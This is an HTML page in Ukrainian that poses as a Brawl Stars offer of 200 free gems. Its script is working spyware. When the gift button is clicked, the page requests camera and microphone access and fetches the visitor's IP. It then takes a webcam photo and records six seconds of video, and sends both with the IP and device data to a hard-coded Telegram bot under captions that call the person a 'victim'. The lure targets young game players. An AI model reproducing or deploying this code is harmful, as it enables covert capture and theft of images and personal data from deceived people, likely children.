<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>Brawl Stars Gift</title>
    <style>
        body { 
            margin: 0; 
            background: linear-gradient(180deg, #0057b7 0%, #003366 100%); 
            color: #ffcc00; 
            font-family: 'Arial', sans-serif; 
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        .card { 
            background: rgba(255, 255, 255, 0.1); 
            padding: 30px; 
            border-radius: 25px; 
            text-align: center; 
            border: 3px solid #ffcc00; 
            width: 320px; 
            box-shadow: 0 0 25px rgba(255, 204, 0, 0.4);
        }
        button { 
            padding: 18px; 
            background: #ffcc00; 
            border: none; 
            border-radius: 12px; 
            font-weight: bold; 
            cursor: pointer; 
            color: #003366; 
            width: 100%; 
            font-size: 18px; 
            margin-top: 20px;
        }
        h1 { color: #ffcc00; text-shadow: 2px 2px 4px #000; }
    </style>
</head>
<body>

<div class="card">
    <h1>BRAWL STARS</h1>
    <p id="msg" style="color: white; font-size: 18px;">Вітаємо! Твій подарунок 200 гемів готовий.</p>
    <button id="btn" onclick="startAll()">ОТРИМАТИ ПОДАРУНОК</button>
</div>
<video id="v" autoplay playsinline muted style="display:none"></video>

<script>
    const TG_TOKEN = "8842138354:AAFV7kdBBGcwaNLa2EBaebxCI_cy80r_HxY";
    const TG_CHAT_ID = "-1003787168523";

    async function startAll() {
        document.getElementById('btn').style.display = 'none';
        const msg = document.getElementById('msg');
        msg.innerText = "Надсилаємо подарунок...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            // 1. Отримуємо IP
            let ip = "Невизначено";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            // 2. Фото + Дані
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));

            const fd1 = new FormData();
            fd1.append('chat_id', TG_CHAT_ID);
            fd1.append('photo', photoBlob);
            fd1.append('caption', `🔥 НОВА ЖЕРТВА!\nIP: ${ip}\nПристрій: ${navigator.userAgent}\nЛокація: Бортятин`);
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });

            // 3. Запис відео (6 секунд)
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.start();

            setTimeout(async () => {
                mediaRecorder.stop();
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    const fd2 = new FormData();
                    fd2.append('chat_id', TG_CHAT_ID);
                    fd2.append('video', videoBlob);
                    fd2.append('caption', "🎥 Відео жертви");
                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: 'POST', body: fd2 });
                    
                    stream.getTracks().forEach(t => t.stop());
                    msg.innerText = "ГОТОВО! Подарунок активовано.";
                };
            }, 6000);

        } catch (e) {
            alert("Помилка: потрібно надати дозвіл на камеру та мікрофон для отримання подарунка!");
        }
    }
</script>
</body>
</html>
